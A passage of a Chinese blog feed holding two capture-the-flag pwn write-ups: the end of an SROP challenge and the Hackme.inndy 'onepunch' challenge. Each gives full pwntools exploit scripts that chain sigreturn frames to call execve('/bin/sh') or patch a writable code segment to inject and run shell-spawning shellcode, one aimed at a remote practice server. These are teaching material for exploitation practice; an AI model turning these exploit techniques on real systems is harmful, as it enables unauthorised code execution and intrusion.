id="0x002-思路"><a href="#0x002-思路" class="headerlink" title="0x002 思路"></a>0x002 思路</h2><p>由于程序没有<code>/bin/sh</code>，我们需要找到一个位置写入<code>/bin/sh</code>，这个位置需要<code>可读可写</code>。</p><p>可以先通过程序自带的一次read进行栈溢出来执行一次sigreturn系统调用，使其能够向指定位置写入<code>/bin/sh</code>，然后再次进行sigreturn系统调用执行<code>execve(&#39;/bin/sh&#39;,0,0)</code></p><p>如何连续进行两次sigreturn系统调用？这里就需要构造SROP链了。<strong>例题2也是构造的SROP链</strong></p><h2 id="0x003-Let’s-do-it"><a href="#0x003-Let’s-do-it" class="headerlink" title="0x003 Let’s do it!"></a>0x003 Let’s do it!</h2><p>我们需要先找到一个位置用来写入<code>/bin/sh</code>，这个位置需要<code>可读可写</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200311222501.png" alt></p><p>可以看到程序的<code>DATA区</code>权限符合我们的要求。这里选择<code>addr = 0x402100</code>吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000401032                 pop     rax</span></span><br><span class="line"><span class="string">.text:0000000000401033                 syscall</span></span><br><span class="line"><span class="string">.text:0000000000401035                 leave</span></span><br><span class="line"><span class="string">.text:0000000000401036                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000401033                 syscall</span></span><br><span class="line"><span class="string">.text:0000000000401035                 leave</span></span><br><span class="line"><span class="string">.text:0000000000401036                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x402100</span></span><br></pre></td></tr></table></figure><p>然后通过SROP执行一次read系统调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#read(0,addr,300)</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = addr</span><br><span class="line">frame.rdx = <span class="number">300</span> </span><br><span class="line">frame.rsp = addr<span class="comment">#注意这里！~</span></span><br><span class="line">frame.rbp = addr<span class="comment">#</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'b'</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pop_rax_syscall_leave_ret)</span><br><span class="line">payload += p64(<span class="number">15</span>) + str(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br></pre></td></tr></table></figure><p>然后向addr写入<code>/bin/sh</code>并再次进行sigreturn系统调用，执行<code>execve(&#39;/bin/sh&#39;,0,0)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + p64(pop_rax_syscall_leave_ret)</span><br><span class="line">payload += p64(<span class="number">15</span>) + str(frame)</span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>注意第一次构造frame的时候，我们设置了frame.rsp = addr，frame.rbp = addr，这是因为由于我们的gadgets是<code>syscall;leave;ret</code>，中间有个<code>leave</code>，<code>leave</code>就相当于<code>mov rsp,rbp;pop rbp</code>，为了构造SROP链，我们需要让rsp指向我们下一个payload的地址(这个可以参考第二个例题)，但如果我们的rbp为0的话，<code>leave</code>以后rsp也为0，这显然不符合我们的要求，所以这个需要<code>让rbp=addr</code>。</p><p>但由于<code>leave</code>还有一个<code>pop rbp</code>的功能，这里构造就较为巧妙，我们addr的位置前8字节正好被写为<code>/bin/sh\x00</code>，这样当我们ret的时候，正好能将<code>p64(pop_rax_syscall_leave_ret)</code>传给rip来执行，然后进行下一次sigreturn系统调用。</p><h2 id="0x004-完整EXP"><a href="#0x004-完整EXP" class="headerlink" title="0x004 完整EXP"></a>0x004 完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)<span class="comment">#Important!!!!!!</span></span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./srop'</span>)</span><br><span class="line"><span class="comment">#c = remote('node3.buuoj.cn',25453)</span></span><br><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000401032                 pop     rax</span></span><br><span class="line"><span class="string">.text:0000000000401033                 syscall</span></span><br><span class="line"><span class="string">.text:0000000000401035                 leave</span></span><br><span class="line"><span class="string">.text:0000000000401036                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000401033                 syscall</span></span><br><span class="line"><span class="string">.text:0000000000401035                 leave</span></span><br><span class="line"><span class="string">.text:0000000000401036                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x402100</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = addr</span><br><span class="line">frame.rdx = <span class="number">300</span> </span><br><span class="line">frame.rsp = addr</span><br><span class="line">frame.rbp = addr</span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'b'</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pop_rax_syscall_leave_ret)</span><br><span class="line">payload += p64(<span class="number">15</span>) + str(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + p64(pop_rax_syscall_leave_ret)</span><br><span class="line">payload += p64(<span class="number">15</span>) + str(frame)</span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><code>context(arch = &#39;amd64&#39;,os = &#39;linux&#39;)#Important!!!!!!</code>这个一定要有，不然frame构造出来可能就不太对了。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/21548933_p0.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/32387154_p0.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>[Hackme.inndy] onepunch</title>
    <link href="http://liul14n.top/2020/03/11/Hackme-inndy-onepunch/"/>
    <id>http://liul14n.top/2020/03/11/Hackme-inndy-onepunch/</id>
    <published>2020-03-10T17:17:48.000Z</published>
    <updated>2020-03-28T19:21:18.396Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/49046439_p0.png" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这道题目是在BUU上面看到的，原本是台湾的一个pwn练习平台hackme.inndy的题目，之前做了几道inndy的题目，感觉难度不大但是挺涨知识的。</p><p>这道题难度不算大，写这篇博客是为了记录一些骚姿势。</p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p>主函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Where What?"</span>, <span class="number">0L</span>L);</span><br><span class="line">  v5 = __isoc99_scanf(<span class="string">"%llx %d"</span>, &amp;v6, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  *v6 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">255</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No flag for you"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个很可疑的函数，名字是个下划线，执行的是mprotect函数，不过这次没用到它。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 _()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">10L</span>L;</span><br><span class="line">  __asm &#123; syscall; LINUX - sys_mprotect &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.text:<span class="number">00000000004006</span>C6 _               proc near               ; DATA XREF: .init_array:<span class="number">0000000000600E10</span>↓o</span><br><span class="line">.text:<span class="number">00000000004006</span>C6 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000004006</span>C6                 push    rbp</span><br><span class="line">.text:<span class="number">00000000004006</span>C7                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000004006</span>CA                 lea     rdi, loc_4006D1</span><br><span class="line">.text:<span class="number">00000000004006</span>D1</span><br><span class="line">.text:<span class="number">00000000004006</span>D1 loc_4006D1:                             ; DATA XREF: _+<span class="number">4</span>↑o</span><br><span class="line">.text:<span class="number">00000000004006</span>D1                 <span class="keyword">and</span>     rdi, <span class="number">0F</span>FFFFFFFFFFFF000h ; start</span><br><span class="line">.text:<span class="number">00000000004006</span>D8                 mov     rsi, <span class="number">1000</span>h      ; len</span><br><span class="line">.text:<span class="number">00000000004006</span>DF                 mov     rdx, <span class="number">7</span>          ; prot</span><br><span class="line">.text:<span class="number">00000000004006E6</span>                 mov     rax, <span class="number">0</span>Ah</span><br><span class="line">.text:<span class="number">00000000004006</span>ED                 syscall                 ; LINUX - sys_mprotect</span><br><span class="line">.text:<span class="number">00000000004006</span>EF                 nop</span><br><span class="line">.text:<span class="number">00000000004006F</span>0                 pop     rbp</span><br><span class="line">.text:<span class="number">00000000004006F</span>1                 retn</span><br><span class="line">.text:<span class="number">00000000004006F</span>1 ; &#125; <span class="comment">// starts at 4006C6</span></span><br><span class="line">.text:<span class="number">00000000004006F</span>1 _               endp</span><br></pre></td></tr></table></figure><p>根据main函数，我们会读入一个16进制的数到v6，然后读入一个10进制的数到v4，然后通过<code>*v6 = v4;</code>向16进制数的地址中写入这个10进制数，但由于前面是<code>_BYTE *v6;</code>，所以我们只能写入一个字节。</p><p><strong>程序存在任意地址写的漏洞，但是只能使用一次，有什么办法能让这个漏洞多次被使用呢？</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200311013422.png" alt></p><p>可以看到0x400000 - 0x401000 的代码段的权限是rwxp，也就是说这个程序的代码段可写！</p><p>接着看main函数的汇编</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200311013844.png" alt></p><p>可以看到程序在判断完v4是否为255以后会有一个jnz跳转，这个在伪代码界面是不显示的，不过可以利用这个修改跳转的目的地来实现多次任意地址写。</p><p>有了<code>多次任意地址写</code>、<code>代码段任意地址跳转</code>并且<code>代码段可写</code>，我们就可以像打着patch做题一样了，可以往代码段写入shellcode然后跳转到shellcode来执行了。</p><h1 id="0x02-Let’s-do-it！"><a href="#0x02-Let’s-do-it！" class="headerlink" title="0x02 Let’s do it！"></a>0x02 Let’s do it！</h1><h2 id="首先通过修改跳转的目的地来实现多次利用任意地址写漏洞"><a href="#首先通过修改跳转的目的地来实现多次利用任意地址写漏洞" class="headerlink" title="首先通过修改跳转的目的地来实现多次利用任意地址写漏洞"></a><strong>首先通过修改跳转的目的地来实现多次利用任意地址写漏洞</strong></h2><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200311021246.png" alt></p><p>在IDA中将这个地方改成4或者5就能看到汇编对应的机器码。</p><p>然后来到刚才提到的<code>.text:0000000000400767 75 0A jnz short loc_400773</code></p><p>其中<code>\x75</code>是<code>jnz</code>的机器码，<code>\x0A</code>是跳转地址的偏移。</p><p>我们先选定一个跳转目的地。</p><p>这里选取了<code>0x40071D mov edi, offset format ; &quot;Where What?&quot;</code></p><p>然后按下<code>N</code>，给他rename一下，这里就改成<code>loc_40071D</code>吧。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/image-20200311021816441.png" alt></p><p>确定以后可以观察到如下形式</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200311021916.png" alt></p><p>然后来到刚刚那个<code>0x400767</code>这个地方进行<code>keypatch</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200311022050.png" alt></p><p>将其改成<code>jnz loc_40071D</code>,就可以看到机器码由原来的<code>75 0A</code>变成了<code>75 B4</code>。</p><p>这也就说明如果我们通过程序原本的一次任意地址写，将这个0A改成B4就能实现多次任意地址写。</p><p>而这个<code>0A</code>在<code>0x400768</code>的位置，实现起来就简单了！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c.recvuntil(<span class="string">'Where What?'</span>)</span><br><span class="line">c.sendline(<span class="string">'0x400768'</span>)</span><br><span class="line">c.sendline(<span class="string">'180'</span>)<span class="comment">#0xB4 == 180</span></span><br></pre></td></tr></table></figure><h2 id="向代码段写入shellcode"><a href="#向代码段写入shellcode" class="headerlink" title="向代码段写入shellcode"></a>向代码段写入shellcode</h2><p>我选的<code>shellcode_addr = 0x400769</code>，因为这块地方很容易触发，只需要让输入的十进制数为0XFF就可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line">sc_addr = <span class="number">0x400769</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shellcode)):</span><br><span class="line">    c.recvuntil(<span class="string">'Where What?'</span>)</span><br><span class="line">    c.sendline(str(hex(sc_addr+i)))</span><br><span class="line">    c.sendline(str(ord(shellcode[i])))</span><br></pre></td></tr></table></figure><p><strong>这里有个细节</strong></p><p>我们需要保证shellcode里面不存在<code>\xff</code>，因为程序会有验证输入的十进制数是否等于<code>0xff</code>！</p><p>比较幸运的是，这么生成的shellcode不含有<code>\xff</code></p><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c.sendline(<span class="string">'0x400000'</span>)</span><br><span class="line">c.sendline(<span class="string">'255'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>向随便一个地方写入个255就能触发程序走向0x400769,也就是我们的shellcode的位置。</p><h1 id="0x03-完整EXP"><a href="#0x03-完整EXP" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#c = process('./onepunch')</span></span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26043</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Where What?'</span>)</span><br><span class="line">c.sendline(<span class="string">'0x400768'</span>)</span><br><span class="line">c.sendline(<span class="string">'180'</span>)<span class="comment">#0xB4 == 180</span></span><br><span class="line"></span><br><span class="line">sc_addr = <span class="number">0x400769</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shellcode)):</span><br><span class="line">    c.recvuntil(<span class="string">'Where What?'</span>)</span><br><span class="line">    c.sendline(str(hex(sc_addr+i)))</span><br><span class="line">    c.sendline(str(ord(shellcode[i])))</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'0x400000'</span>)</span><br><span class="line">c.sendline(<span class="string">'255'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://carlstar.club/2018/11/06/onepunch/#%E6%80%9D%E8%B7%AF" target="_blank" rel="noopener">传送门</a></p><p><a href="https://xz.aliyun.com/t/3700#toc-10" target="_blank" rel="noopener">先知社区</a></p><p><a href="https://blog.csdn.net/charlie_heng/article/details/78941701" target="_blank" rel="noopener">CSDN</a></p><p>感谢各位师傅们的博客</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/79742165_p0.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/49046439_p0.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
    
    
  </entry>
  
</feed>
